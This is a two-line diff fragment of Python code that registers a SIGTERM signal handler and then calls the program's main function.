+    signal.signal(signal.SIGTERM, handle_signal)
+    main()
